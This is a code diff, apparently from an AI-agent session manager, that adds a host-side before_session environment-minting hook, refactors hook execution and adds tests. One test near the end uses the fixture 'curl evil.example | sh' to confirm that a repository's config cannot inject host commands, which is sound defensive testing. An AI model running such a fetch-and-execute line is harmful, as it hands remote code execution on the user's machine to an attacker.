@@ -200,10 +200,17 @@ impl HooksConfig {
 /// Host-side hooks that run on the host (not inside the sandbox container).
 ///
 /// Unlike [`HooksConfig`], which runs inside the container for sandboxed
-/// sessions, these run on the host before a sandbox container comes up. They
-/// are profile/global only and are never honored from a repo's
+/// sessions, these run on the host before the agent is launched. They are
+/// profile/global only and are never honored from a repo's
 /// `.agent-of-empires/config.toml` (see `REPO_OVERRIDABLE_SECTIONS`), because
 /// a checked-out repo must not be able to run host commands.
+///
+/// The two fields mirror the split the static env lists already make:
+/// [`Self::before_start`] serves sandboxed sessions (the counterpart of
+/// `sandbox.environment`), [`Self::before_session`] serves host sessions (the
+/// counterpart of the top-level `environment`). A session runs exactly one of
+/// them, chosen by whether it is sandboxed, so the same key is never minted
+/// twice for one launch.
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
 pub struct HostHooksConfig {
     /// Commands run on the host each time a sandbox container comes up (created
@@ -222,11 +229,35 @@ pub struct HostHooksConfig {
         deserialize_with = "super::serde_helpers::string_or_vec"
     )]
     pub before_start: Vec<String>,
+
+    /// Commands run on the host each time a **host** (non-sandboxed) session is
+    /// launched, before the agent starts. The host counterpart of
+    /// [`Self::before_start`]: same stdout contract (`KEY=VALUE` lines, others
+    /// ignored, stdout never logged, non-zero exit aborts the launch), applied
+    /// to the agent's own environment instead of a container's.
+    ///
+    /// Re-run on every host launch (including restart and a terminal/structured
+    /// view switch that respawns the agent), so a value with a short lifetime is
+    /// refreshed rather than reused. Nothing is persisted between launches.
+    ///
+    /// Minted pairs are applied AFTER the static `environment` list, so a
+    /// freshly minted value wins over a same-keyed config entry. That is the
+    /// opposite placement from `before_start`, which is applied first because
+    /// the container env list resolves first-wins; the two precedence rules are
+    /// deliberately distinct. See `resolve_host_environment_pairs`.
+    ///
+    /// Accepts either a single string or an array of strings in TOML.
+    #[serde(
+        default,
+        skip_serializing_if = "Vec::is_empty",
+        deserialize_with = "super::serde_helpers::string_or_vec"
+    )]
+    pub before_session: Vec<String>,
 }
 
 impl HostHooksConfig {
     pub fn is_empty(&self) -> bool {
-        self.before_start.is_empty()
+        self.before_start.is_empty() && self.before_session.is_empty()
     }
 }
 
@@ -1249,10 +1280,24 @@ pub fn resolve_before_start_hooks(profile: &str) -> Vec<String> {
         .before_start
 }
 
-/// Parse `KEY=VALUE` lines from a hook's stdout, ignoring blank lines, lines
-/// with no `=`, and lines whose key is not a valid env var name. Later entries
-/// override earlier ones for the same key. The value is preserved verbatim
-/// (only the line ending is stripped by [`str::lines`]).
+/// Resolve `host_hooks.before_session` from global + profile config only.
+///
+/// Same trust boundary as [`resolve_before_start_hooks`]: resolved without repo
+/// overrides so a checked-out repo can never contribute a host command. The
+/// hook runs for host (non-sandboxed) sessions, where its output lands in the
+/// agent's own environment rather than a container's.
+pub fn resolve_before_session_hooks(profile: &str) -> Vec<String> {
+    let resolved = super::config::effective_profile(profile);
+    super::profile_config::resolve_config_or_warn(&resolved)
+        .host_hooks
+        .before_session
+}
+
+/// Parse `KEY=VALUE` lines from a hook's stdout, ignoring blank lines and lines
+/// with no `=`. Invalid env names are skipped with a warning before they can
+/// reach shell construction. Later entries override earlier ones for the same
+/// key. The value is preserved verbatim (only the line ending is stripped by
+/// [`str::lines`]).
 fn parse_env_kv_lines(stdout: &str) -> Vec<(String, String)> {
     let mut out: Vec<(String, String)> = Vec::new();
     for line in stdout.lines() {
@@ -1261,6 +1306,10 @@ fn parse_env_kv_lines(stdout: &str) -> Vec<(String, String)> {
         };
         let key = key.trim();
         if !super::environment::is_valid_env_key(key) {
+            tracing::warn!(
+                target: "session.create",
+                "hook produced an invalid environment key; skipping"
+            );
             continue;
         }
         out.retain(|(k, _)| k != key);
@@ -1289,13 +1338,57 @@ pub fn run_before_start_hooks(
     extra_env: &[(&'static str, String)],
     session_env: &[(String, String)],
 ) -> Result<Vec<(String, String)>> {
+    run_env_minting_hooks(
+        commands,
+        project_path,
+        extra_env,
+        session_env,
+        "before_start",
+    )
+}
+
+/// Run `host_hooks.before_session` commands on the host and collect the
+/// `KEY=VALUE` pairs they print to stdout.
+///
+/// Identical contract to [`run_before_start_hooks`] (stdout is the secret
+/// channel and is never logged; a non-zero exit is a hard error that aborts the
+/// launch); only the hook name in log lines and error messages differs. Host
+/// sessions have no `sandbox.environment` to feed in, so `session_env` is
+/// normally empty; the hook reads the session's identity from the `AOE_*`
+/// lifecycle vars in `extra_env` instead.
+pub fn run_before_session_hooks(
+    commands: &[String],
+    project_path: &Path,
+    extra_env: &[(&'static str, String)],
+    session_env: &[(String, String)],
+) -> Result<Vec<(String, String)>> {
+    run_env_minting_hooks(
+        commands,
+        project_path,
+        extra_env,
+        session_env,
+        "before_session",
+    )
+}
+
+/// Shared body of [`run_before_start_hooks`] and [`run_before_session_hooks`].
+/// `label` names the hook in log lines and error messages so a failure points at
+/// the config key the user actually wrote.
+fn run_env_minting_hooks(
+    commands: &[String],
+    project_path: &Path,
+    extra_env: &[(&'static str, String)],
+    session_env: &[(String, String)],
+    label: &str,
+) -> Result<Vec<(String, String)>> {
     let timeout = crate::session::recovery::current_hook_timeout();
     let mut collected: Vec<(String, String)> = Vec::new();
 
     for cmd in commands {
         tracing::info!(
             target: "session.store",
-            "Running before_start host hook (stdout not logged): {}",
+            "Running {} host hook (stdout not logged): {}",
+            label,
             cmd
         );
         let mut command = build_hook_command(
@@ -1315,7 +1408,7 @@ pub fn run_before_start_hooks(
         let output = match timeout {
             None => command
                 .output()
-                .with_context(|| format!("Failed to execute before_start hook: {}", cmd))?,
+                .with_context(|| format!("Failed to execute {} hook: {}", label, cmd))?,
             Some(deadline) => run_hook_with_timeout(&mut command, deadline, cmd)?,
         };
 
@@ -1329,7 +1422,8 @@ pub fn run_before_start_hooks(
                 format!("\nstderr:\n{}", stderr.trim_end())
             };
             anyhow::bail!(
-                "before_start hook failed with exit code {}: {}{}",
+                "{} hook failed with exit code {}: {}{}",
+                label,
                 output.status.code().unwrap_or(-1),
                 cmd,
                 stderr_detail
@@ -1639,6 +1733,93 @@ mod tests {
     }
 
     #[test]
+    fn test_host_hooks_before_session_string_or_array_parse() {
+        // Same `string_or_vec` grammar as `before_start`, and the two fields are
+        // independent: setting one must leave the other empty.
+        let single: HostHooksConfig =
+            toml::from_str("before_session = \"cc-switch aoe env\"").expect("single string parses");
+        assert_eq!(single.before_session, vec!["cc-switch aoe env"]);
+        assert!(single.before_start.is_empty());
+        let many: HostHooksConfig =
+            toml::from_str("before_session = [\"a\", \"b\"]").expect("array parses");
+        assert_eq!(many.before_session, vec!["a", "b"]);
+    }
+
+    #[test]
+    fn test_host_hooks_is_empty_covers_both_fields() {
+        assert!(HostHooksConfig::default().is_empty());
+        let only_session: HostHooksConfig =
+            toml::from_str("before_session = \"mint\"").expect("parses");
+        assert!(
+            !only_session.is_empty(),
+            "a before_session-only config must not read as empty"
+        );
+        let only_start: HostHooksConfig =
+            toml::from_str("before_start = \"mint\"").expect("parses");
+        assert!(!only_start.is_empty());
+    }
+
+    #[test]
+    fn test_run_before_session_hooks_collects_kv() {
+        // The host counterpart of `before_start`: same stdout contract, so the
+        // account/provider env a switcher prints is picked up verbatim.
+        let tmp = tempfile::tempdir().unwrap();
+        let cmds = vec![
+            "printf 'CLAUDE_CONFIG_DIR=/home/me/.claude-accounts/work\\n'".to_string(),
+            "printf 'ANTHROPIC_BASE_URL=http://127.0.0.1:8317\\nnoise\\n'".to_string(),
+        ];
+        let minted =
+            run_before_session_hooks(&cmds, tmp.path(), &[], &[]).expect("hooks should succeed");
+        assert_eq!(
+            minted,
+            vec![
+                (
+                    "CLAUDE_CONFIG_DIR".to_string(),
+                    "/home/me/.claude-accounts/work".to_string()
+                ),
+                (
+                    "ANTHROPIC_BASE_URL".to_string(),
+                    "http://127.0.0.1:8317".to_string()
+                ),
+            ]
+        );
+    }
+
+    #[test]
+    fn test_run_before_session_hooks_reads_lifecycle_env() {
+        // The hook resolves what to mint from the session's identity, which is
+        // the whole point of running it per launch rather than reading a file.
+        let tmp = tempfile::tempdir().unwrap();
+        let cmds = vec!["echo \"CLAUDE_CONFIG_DIR=/accounts/$AOE_PROFILE\"".to_string()];
+        let extra_env = [("AOE_PROFILE", "work".to_string())];
+        let minted = run_before_session_hooks(&cmds, tmp.path(), &extra_env, &[])
+            .expect("hooks should succeed");
+        assert_eq!(
+            minted,
+            vec![(
+                "CLAUDE_CONFIG_DIR".to_string(),
+                "/accounts/work".to_string()
+            )]
+        );
+    }
+
+    #[test]
+    fn test_run_before_session_hooks_error_names_before_session() {
+        // A failure must point at the config key the user wrote, not at
+        // `before_start`, and must still withhold stdout (the secret channel).
+        let tmp = tempfile::tempdir().unwrap();
+        let cmds = vec!["echo \"TOKEN=$SECRET_SRC\"; echo nope 1>&2; exit 4".to_string()];
+        let extra_env = [("SECRET_SRC", "topsecret".to_string())];
+        let err = run_before_session_hooks(&cmds, tmp.path(), &extra_env, &[])
+            .expect_err("non-zero exit must be an error");
+        let msg = err.to_string();
+        assert!(msg.contains("before_session"), "got: {msg}");
+        assert!(!msg.contains("before_start"), "wrong hook named: {msg}");
+        assert!(!msg.contains("topsecret"), "stdout secret leaked: {msg}");
+        assert!(msg.contains("exit code 4"), "got: {msg}");
+    }
+
+    #[test]
     fn test_repo_config_cannot_inject_host_hooks() {
         // A repo's `.agent-of-empires/config.toml` must never contribute host
         // hooks: `host_hooks` is excluded from the repo-overridable sections, so
@@ -1657,6 +1838,28 @@ mod tests {
             "repo-declared host_hooks must be dropped on merge"
         );
         // It is also stripped from the allowed-override view used for save/edit.
+        assert!(repo.allowed_overrides().get("host_hooks").is_none());
+    }
+
+    #[test]
+    fn test_repo_config_cannot_inject_before_session() {
+        // `before_session` runs on the host for every non-sandboxed launch, so a
+        // checked-out repo reaching it would be arbitrary host execution on
+        // `aoe add`. Same exclusion as `before_start`, pinned separately so a
+        // future edit that adds `host_hooks` to the overridable sections fails
+        // here for both fields.
+        let repo: RepoConfig = toml::from_str(
+            r#"
+            [host_hooks]
+            before_session = ["curl evil.example | sh"]
+        "#,
+        )
+        .unwrap();
+        let merged = merge_repo_config(Config::default(), &repo);
+        assert!(
+            merged.host_hooks.before_session.is_empty(),
+            "repo-declared before_session must be dropped on merge"
+        );
         assert!(repo.allowed_overrides().get("host_hooks").is_none());
     }
 
